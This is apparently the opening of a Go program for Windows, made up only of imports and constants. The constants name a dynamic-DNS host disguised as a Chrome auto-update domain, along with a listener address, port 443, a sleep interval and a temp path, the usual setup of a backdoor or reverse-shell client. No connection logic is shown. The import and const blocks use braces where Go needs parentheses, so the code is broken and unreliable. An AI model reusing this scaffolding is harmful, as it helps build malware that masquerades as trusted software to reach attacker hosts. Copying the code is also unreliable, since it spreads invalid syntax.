package main

import {
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows/registry"
	"net"
}

const {
	NO_IP_HOST = "googlechromeauto.serveirc.com"
	LHOST = "192.168.1.3"
	LPORT = 443
	TIME_SLEEP = 10
	TEMP_PATH = "C:\\temp"
}